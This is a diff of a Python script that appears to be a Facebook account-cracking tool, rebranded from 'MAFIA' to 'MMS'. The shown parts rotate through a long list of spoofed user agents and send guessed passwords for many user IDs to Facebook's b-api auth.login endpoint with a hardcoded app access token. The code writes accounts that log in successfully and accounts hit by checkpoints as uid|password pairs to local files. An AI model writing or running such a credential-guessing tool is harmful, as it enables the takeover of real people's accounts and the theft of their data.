 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
@@ -962,26 +960,6 @@ class Main:
   "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2",
   "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
   "Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
-  "Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.1.8.1295 Mobile Safari/537.36",
-  "Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 Instagram 169.1.0.29.135 Android (22/5.1; 320dpi; 720x1280; OPPO; A1601; A1601; mt6755; en_GB; 262886987)",
-  "Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36 YaApp_Android/10.20 YaSearchBrowser/10.20",
-  "Mozilla/5.0 (Linux; Android 6.0.1; vivo 1606 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/5.5.5',
-  "Mozilla/5.0 (Linux; Android 10; vivo 1920; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.8.0.1",	 
-  "Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 GSA/11.18.11.21.arm",
-  "Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 OPR/52.2.2254.54723",
-  "Mozilla/5.0 (Linux; Android 7.1.1; OPPO CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36",
-  "Mozilla/5.0 (Linux; Android 8.1.0; CPH1819 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36",
-  "Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36 YaApp_Android/9.00 YaSearchBrowser/9.00",
-  "Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36",
-  "Mozilla/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36 YaApp_Android/11.20 YaSearchBrowser/11.20",
-  "Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36 OPR/51.0.2254.150807",
-  "Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.149 Mobile Safari/537.36 GSA/11.0.10.21.arm",
-  "Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36 GSA/10.94.12.21.arm",
-  "Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 GSA/10.84.19.21.arm",
-  "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1802 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36",
-  "Mozilla/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36 YaApp_Android/10.61 YaSearchBrowser/10.61",
-  "Mozilla/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 YaApp_Android/10.70 YaSearchBrowser/10.70",
-  "Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
   "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
   "Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
   "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
@@ -1337,9 +1315,9 @@ class Main:
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36",
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
-		])
+	])
 		sys.stdout.write(
-			"\r [ MAFIA ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [+]>%s/[MMS]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1367,25 +1345,31 @@ class Main:
     'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'viewport-width': '980',
 }
-			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
+			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ MAFIA,𝑶𝑲 ] %s | %s\033[0;97m         "%(uid, pw))
-				print ("\r \033[0;92m Congrats Bro ")
+				print("\r \033[1;32m[MMS] %s | %s\033[0;32m         "%(uid, pw))
+				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-MAFIA-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("MMS-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m [MAFIA-𝑶𝑲 ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[1;32m[MMS] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-MAFIA-𝑶𝑲.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("Successfull.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
-
+ 
 		self.loop +=1
-
-
-
+ 
+if len(sys.argv) == 2:
+	if sys.argv[1] == "--help" or sys.argv[1] == "-h":
+		helpnote()
+	else:
 		Main()
-	        
-    
+ 
+try:Main()
+except Exception as e:exit(str(e))
+ 
+
+	
